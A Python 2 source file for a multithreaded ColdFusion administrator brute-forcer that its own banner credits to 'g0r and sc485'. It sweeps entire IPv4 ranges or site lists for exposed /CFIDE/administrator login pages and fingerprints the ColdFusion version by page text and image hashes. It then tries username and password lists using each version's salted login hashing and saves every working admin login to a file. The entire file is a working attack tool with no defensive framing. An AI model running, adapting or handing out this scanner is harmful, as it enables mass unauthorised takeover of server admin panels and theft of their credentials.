import time
import sys
import os
import ssl
import argparse
from socket import timeout as socket_timeout
from socket import error as socket_error
import hmac
import hashlib
import re


# Import requests, to handle the get and post requests
try:

    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning

except ImportError:
    print '[!]Could not import requests module.'
    sys.exit()

try:
    from bs4 import BeautifulSoup
    from bs4 import SoupStrainer

except ImportError:
    print '[!]Could not import BeautifulSoup module.'
    sys.exit()

# Import order matters for pyinstaller
import Queue
import threading

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

CONNECTION_EXCEPTION = (ssl.SSLError, requests.exceptions.RequestException,
                        socket_error, socket_timeout)

ADMIN_URL = '/CFIDE/administrator/index.cfm'
ADMIN_LOGIN_URL = '/CFIDE/administrator/enter.cfm'
IMAGES_FOLDER_URL = '/CFIDE/administrator/images/'

ADMIN_LOGIN_TITLE = 'ColdFusion Administrator Login'

PARSING_CONSTRAINT_VERSION = SoupStrainer(['title', 'span',
                                           'meta', 'img',
                                           'table', 'p'])

PARSING_CONSTRAINT_SALT = SoupStrainer('input', {'name': 'salt',
                                                 'type': 'hidden',
                                                 'value': True})

PARSING_CONSTRAINT_USERNAME = SoupStrainer('input', {'name': 'cfadminUserId'})

VERSION_MX_PATTERN = re.compile(r'\s*Version:\s*(?:6|7)')

VERSION_10_11_PATTERN = re.compile(
    '1997-2012 Adobe Systems Incorporated and its licensors'
)

VERSION_COPYRIGHT_SUBSTRINGS = (
    (9, 'Copyright (c) 1995-2009 Adobe Systems, Inc. All rights reserved'),
    (9, 'Copyright (c) 1997-2012 Adobe Systems, Inc. All rights reserved'),

    # These are not full proof tests:
    (9, 'Copyright (c) 1995-2010 Adobe'),
    (8, 'Copyright (c) 1995-2006 Adobe'),
    (7, 'Copyright 1995-2012 Adobe')
)

VERSION_IMAGE_HASHES = {

    # AdminColdFusionLogo.gif
    # '620b2523e4680bf031ee4b1538733349': 7,

    # loginbackground.jpg
    '779efc149954677095446c167344dbfc': 8,
    '596b3fc4f1a0b818979db1cf94a82220': 9,
    'a4c81b7a6289b2fc9b36848fa0cae83c': 10,
    '457c6f1f26d8a030a9301e975663589d': 11,

    # ColdFusion 11 Beta
    '9d11ede6e4ca9f1bf57b856c0df82ee6': 11,
}


def read_file(filename_to_read):
    """Read each line of a file into a set."""

    lines = []
    with open(filename_to_read, 'r') as hFile:

        for file_line in hFile:

            file_line = file_line.strip()
            if file_line and not file_line.startswith('#'):
                lines.append(file_line)

    return lines


def login_generator(username_disabled=False):
    if username_disabled:
        username_list = usernames
    else:
        username_list = ('admin', )

    for username in username_list:

        for password in passwords:

            if '%user%' in password:
                password = password.replace('%user%', username)

            yield (username, password)


def version_by_image(session, url):
    """Retrieve image and get the version based on the md5 hash of the image"""
    try:

        image_response = session.get(url,
                                     stream=True,
                                     verify=False)

    except CONNECTION_EXCEPTION:
        return False

    image_hash = hashlib.md5()
    for chunk in image_response.raw:
        image_hash.update(chunk)

    image_hash = image_hash.hexdigest()
    if image_hash in VERSION_IMAGE_HASHES:
        return VERSION_IMAGE_HASHES[image_hash]

    return False


def fingerprint_version(session, url, html_data):
    """Fingerprint the version of a ColdFusion site
       based on the admin login page."""

    bs_parser = BeautifulSoup(html_data, 'html.parser',
                              parse_only=PARSING_CONSTRAINT_VERSION)

    # Version 8, 9, 10 or 11
    if bs_parser.find('table',
                      {
                          'background':
                              '/CFIDE/administrator/images/loginbackground.jpg'
                      }
                      ):

        version = version_by_image(session,
                                   url + '/CFIDE/administrator/images/'
                                         'loginbackground.jpg'
                                   )

        if version:
            return version

    # Version 7
    if bs_parser.find('img', {'src': '/CFIDE/administrator/images/'
                                     'AdminColdFusionLogo.gif'
                              }
                      ):
        return 7

    # Version 6 or 7
    span_tag = bs_parser.find('span', text=VERSION_MX_PATTERN)
    if span_tag:

        index_6 = span_tag.text.find('6')
        index_7 = span_tag.text.find('7')

        if index_6 == -1:
            return 7

        elif index_7 == -1:
            return 6

        elif index_6 < index_7:
            return 6

        # index_7 < index_6
        else:
            return 7

    # Version 8 or 9
    meta_author_tag = bs_parser.find('meta', {'name': 'Author',
                                              'content': True}
                                     )

    copyright_string = meta_author_tag['content']
    licensors_tag = bs_parser.find('p', {'class': 'loginCopyrightText'},
                                   text=VERSION_10_11_PATTERN)

    for version, copyright_match_substring in VERSION_COPYRIGHT_SUBSTRINGS:

        if copyright_match_substring in copyright_string:

            if version == 9 and not licensors_tag:
                return 9

            elif version == 8:
                return 8

    return False


def retrieve_salt(session, url):

    try:
        response = session.get(url + ADMIN_LOGIN_URL,
                               verify=False)

    except CONNECTION_EXCEPTION:
        return False

    else:

        bs_parser = BeautifulSoup(response.text, 'html.parser',
                                  parse_only=PARSING_CONSTRAINT_SALT
                                  )

        salt_input_tag = bs_parser.find(PARSING_CONSTRAINT_SALT)

        if salt_input_tag:
            return str(salt_input_tag['value'])


def perform_login(session, url, version, username, password):
    """"""

    if url in login_ips_found:
        return

    output_queue.put(('p', '[*]Trying login: {0} : {1} : {2}'.format(url,
                                                                     username,
                                                                     password)
                      ))

    login_data = {
        'submit': 'Login',
        'requestedURL': ADMIN_LOGIN_URL + '?'
    }

    if version == 6:
        login_data.update(
            {
                'cfadminPassword': password,
                'requestedURL': ADMIN_LOGIN_URL
            }
        )

    elif version in xrange(7, 12):
        salt = retrieve_salt(session, url)

        if not salt:
            return False

        if version in xrange(7, 10):

            login_data.update(
                {
                    'salt': salt,
                }
            )

            login_hash = hmac.new(salt,
                                  hashlib.sha1(password).hexdigest().upper(),
                                  hashlib.sha1
                                  ).hexdigest().upper()

        # Version 10 and 11
        else:
            login_hash = hashlib.sha1(password).hexdigest().upper()

        login_data.update(
            {
                'cfadminPassword': login_hash,
            }
        )

        if version != 7:
            login_data.update(
                {
                    'cfadminUserId': username,
                }
            )

    try:
        response = session.post(url + ADMIN_LOGIN_URL,
                                data=login_data,
                                verify=False
                                )

    except CONNECTION_EXCEPTION:
        return False

    else:
        if (response.ok or response.status_code == 302) and \
                        ADMIN_LOGIN_TITLE not in response.text:

            login_ips_found.append(url)
            if version in xrange(6, 8):
                output_string = '{} : {}'.format(url, password)
            else:
                output_string = '{} : {} : {}'.format(url, username, password)

            output_queue.put(('p', '[+]Found login: {}'.format(output_string)))

            output_queue.put(('w', output_string))


def perform_fingerprint(session, url, html_data):
    """"""
    output_queue.put(('p', '[*]Fingerprinting {0}'.format(url)))

    version = fingerprint_version(session, url, html_data)

    if version:
        output_queue.put(('p', '[+]Version Found {} : {}'.format(url,
                                                                 version)
                          ))

        if version == 11:
            output_queue.put(('w', '{} : V11'.format(url)))

        bs_parser = BeautifulSoup(html_data, 'html.parser',
                                  parse_only=PARSING_CONSTRAINT_USERNAME
                                  )

        username_input_tag = bs_parser.find(PARSING_CONSTRAINT_USERNAME)

        if (username_input_tag and username_input_tag.has_attr('disabled'))\
                or version in xrange(6, 8):

            for username, password in login_generator(username_disabled=False):
                login_queue.put((session, url, version, username, password))

        else:
            for username, password in login_generator():
                login_queue.put((session, url, version, username, password))


def perform_coldfusion_check(url):
    """"""
    output_queue.put(('p', '[*]Scanning {}'.format(url)))

    session = requests.session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'
    })

    try:
        response = session.get(url + ADMIN_URL,
                               verify=False,
                               timeout=5
                               )

    except CONNECTION_EXCEPTION:

        if url.startswith('http://'):
            check_coldfusion_queue.put((url.replace('http', 'https', 1), ))

    else:
        if response.ok and ADMIN_LOGIN_TITLE in response.text:
            fingerprint_queue.put((session, url, response.text))
            output_queue.put(('p', '[+]Possible: {0}'.format(url)))


def run(thread_id):
    """"""

    output_queue.put(('p', '[*]Starting'.format(thread_id)))

    while not main_shutdown_event.is_set():
        # The order of execution
        # Top first (the last step), bottom last(the first step)
        for getQueue, function in (

                (login_queue, perform_login),
                (fingerprint_queue, perform_fingerprint),
                (check_coldfusion_queue, perform_coldfusion_check),
        ):

            try:

                data = getQueue.get(block=False)

            except Queue.Empty:
                pass

            else:

                function(*data)

                getQueue.task_done()

    output_queue.put(('p', '[*]Exiting'.format(thread_id)))


def output_thread():
    """The thread that does the non thread-safe output."""

    sys.stdout.write('[+]Thread-OUT:\tStarting\n')

    while not output_shutdown_event.is_set():
        try:
            mode, message = output_queue.get(block=False)

        except Queue.Empty:
            pass

        else:

            message = unicode(message, errors='ignore')
            message += '\n'

            if mode == 'p':
                sys.stdout.write(message)

            elif mode == 'w':
                with open(args.output_file, 'a') as hOut:
                    hOut.write(str(message))

            output_queue.task_done()

    sys.stdout.write('[*]Thread-OUT:\tExiting\n')


arg_parser = argparse.ArgumentParser(
    description='ColdFusion bruteforcer made by g0r and sc485!'
)


arg_parser.add_argument('-sf', '--sites-file',
                        type=str,
                        metavar='sites.txt',
                        help='File containing the input ips/domains.'
                        )

arg_parser.add_argument('-rs', '--range-start',
                        type=str, metavar='12.34.',
                        help='The start of the ip range. \'12.34.\' '
                             'means 12.34.0.0 - 12.34.255.255'
                        )


arg_parser.add_argument('-uf', '--user-file',
                        type=str,
                        metavar='users.txt',
                        help='File containing the usernames.',
                        required=True
                        )

arg_parser.add_argument('-pf', '--pass-file',
                        type=str,
                        metavar='passwords.txt',
                        help='File containing the passwords.',
                        required=True
                        )

arg_parser.add_argument('-of', '--output-file',
                        type=str,
                        metavar='out.txt',
                        help='File the output will be written to.',
                        required=True
                        )

arg_parser.add_argument('-thr', '--threads',
                        type=int,
                        metavar='n',
                        help='Number of threads.',
                        required=True
                        )

args = arg_parser.parse_args()

if not args.range_start and not args.sites_file:
    arg_parser.error('Either an ip range or a sites input file '
                     'need to be specified (or both).')

if args.range_start and not re.match(
        r'(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.)'
        r'{1,3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)?$',

        args.range_start):

    arg_parser.error(' --range-start/-rs is not a valid ip address.')

# Check if the files exist.
for filename in (args.sites_file, args.user_file, args.pass_file):
    if filename and not os.path.isfile(filename):
        print '[!]File {0} not found!'.format(filename)
        sys.exit()

print '[*]Starting scanner!'
print '[*]Made by g0r and sc485'
start_time = time.time()

# Create queue objects
check_coldfusion_queue = Queue.Queue()
fingerprint_queue = Queue.Queue()
login_queue = Queue.Queue()

output_queue = Queue.Queue()

# Create events
main_shutdown_event = threading.Event()
output_shutdown_event = threading.Event()

login_ips_found = []

print '[*]Reading usernames.'
usernames = read_file(args.user_file)

print '[*]Reading passwords.'
passwords = read_file(args.pass_file)

print '[*]Reading sites file'
if args.sites_file:
    with open(args.sites_file) as hSites:
        for line in hSites:

            line = line.strip()
            if not line.startswith('#') and line.count('.') > 1:
                check_coldfusion_queue.put(('http://' + line, ))

print '[*]Creating ip list.'
if args.range_start:

    if args.range_start.endswith('.'):
        range_pre = args.range_start[:-1]
    else:
        range_pre = args.range_start

    start_ip = range_pre + '.0' * (4 - range_pre.count('.') - 1)
    end_ip = range_pre + '.255' * (4 - range_pre.count('.') - 1)

    sys.stdout.write('[*]Adding Ip range: {0} - {1}\n'
                     .format(start_ip, end_ip))

    start = list(map(int, start_ip.split('.')))
    end = list(map(int, end_ip.split('.')))
    temp = start

    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i - 1] += 1

        check_coldfusion_queue.put(('http://' + '.'.join(map(str, temp)), ))


nr_of_sites = check_coldfusion_queue.qsize()
if nr_of_sites == 0 or len(usernames) == 0 or len(passwords) == 0:
    print '[!]No targets found!'
    sys.exit()

print '[*]Found {0} targets.'.format(nr_of_sites)

if nr_of_sites < args.threads:
    args.threads = nr_of_sites

print '[*]Starting {0} scanning threads.'.format(args.threads)

for i in range(args.threads):
    t = threading.Thread(target=run,
                         args=(i + 1,))
    t.start()

print '[*]Starting output thread.'
t = threading.Thread(target=output_thread)
t.start()

# Work down the queues until they are all empty.
check_coldfusion_queue.join()
fingerprint_queue.join()
login_queue.join()

main_shutdown_event.set()

# Write and print the last few messages and then exit
output_queue.join()

output_shutdown_event.set()

sys.stdout.write('[+]Done! Time: {time:.2f} seconds.\n'.format(
    time=time.time() - start_time)
)
